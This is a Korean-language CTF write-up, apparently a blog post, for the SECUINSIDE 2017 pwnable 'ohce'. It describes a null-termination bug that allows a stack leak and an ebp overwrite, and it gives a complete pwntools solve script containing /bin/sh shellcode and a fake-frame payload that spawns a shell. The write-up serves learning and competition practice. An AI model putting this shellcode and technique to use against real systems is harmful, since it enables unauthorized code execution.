---
title: SECUINSIDE 2017 - ohce
categories:
 - pwnable
tags: secuinside, pwn, shellcode
---

## Introduction

꽤 오랜만의 문제풀이 포스팅을 한다. 확실히 근 한달동안 문제풀이보다는 분석을 진행하다 보니까 감이 많이 떨어진게 느껴졌다.

이제 적어도 한달 이상은 web, pwnable 문제풀이에 집중할 예정이다.


## Vulnerability

```
-----------------
1. echo
2. echo(Reverse)
3. Exit
-----------------
 >
```

```
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /workspace/z3-practice/secuinside/ohce/ohce
0x00600000         0x00601000         rwxp      /workspace/z3-practice/secuinside/ohce/ohce
0x00007fff35559000 0x00007fff3557a000 rwxp      [stack]
0x00007fff355fc000 0x00007fff355fe000 r--p      [vvar]
0x00007fff355fe000 0x00007fff35600000 r-xp      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

1번 메뉴에 stack leak이 존재하고 2번에서 ebp를 overwrite 할 수 있다. 취약점은 엄청 간단한데, input을 받는 함수는 '\x0a'(개행문자까지 받도록 동작하는데 그 끝에 null 문자를 붙여주지 않는다. 문제는 그 후 해당 input의 길이를 구할때 null문자까지 카운팅을 하게되는데 이 때 input의 길이(개행문자 포함해서)를 0x20의 배수로 맞춰주면 input 문자열 뒤에 있는 FSP까지 카운팅을 하게된다.

따라서 echo(Reverse)에서 ebp를 overwrite 할 수 있는 취약점이 발생한다.

## Exploit

vmmap을 살펴보게 되면 stack과 bss영역쪽에 실행권한이 존재하게 되어 stack에 그냥 shellcode 넣어서 fake ebp 넣은 후에 stack frame을 잘 설정해서 exploit을 진행하면 된다.

## slv.py

```python
from pwn import *

p = process('./ohce')

sla = lambda c, s: p.sendlineafter(c, str(s))
sa = lambda c, s: p.sendafter(c, str(s))
sl = lambda s: p.sendline(str(s))
s = lambda s: p.send(str(s))


shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

def echo(r):
	
	sla('> ', 1)
	sl(r)
	
	return

def rev_echo(r):
	
	sla('> ', 2)
	sl(r)
	
	return

def stack_leak():
	
	payload = ''
	payload += 'a' * 0x1f
	echo(payload)
	
	leak = u64(p.recvuntil('-').split('\x0a')[1].ljust(8,'\x00'))
	
	log.info('leak : ' + hex(leak))
	
	return leak

def exploit():
	
	return

def main():
	
	### STAGE 1 ###
	#  STACK LEAK #
	
	leak = stack_leak()
	
	### STAGE 2 ###
	
	payload = ''
	payload += 'a'*0x8 # dummy
	payload += p64(leak-0x4f) # ret
	payload += 'a'*0x250 # dummy
	
	echo(payload)
	
	### STAGE 3 ###
	
	payload = ''
	payload += 'b'*0x20 # dummy
	payload += shellcode # destination
	payload += 'c'*0x20 # dummy
	payload += p64(leak-0x290).replace('\x00','') # fake ebp
	payload = 'a'* (0x20-((len(payload)+1) % 0x20)) + payload # padding 0x20
	payload = payload[::-1] # reverse payload 

	rev_echo(payload)

	p.interactive()
	
	return

if __name__ == '__main__':
	main()
```

참고로 ASLR 특성상 한번씩 stack leak의 주소에 null byte가 포함되는 경우에는 에러가 뜰 수 있다. 추가적으로 null byte를 넣을 수 없기 때문에 `STAGE 2`를 이용해서 shellcode의 주소를 미리 stack에 넣어주고 그 뒤에 `STAGE 3`을 진행했다.

## 깨달은 점

- binary에서 input을 받거나 counting 할때 개행문자와 널문자를 어떻게 검사하는지 확인해야 된다.

- 23 byte 짜리 shellcode는 stack이 null로 구성되어 있다는 가정하에 '/bin//sh'문자열에 null을 추가해주지 않는다.


:smile::smile::smile: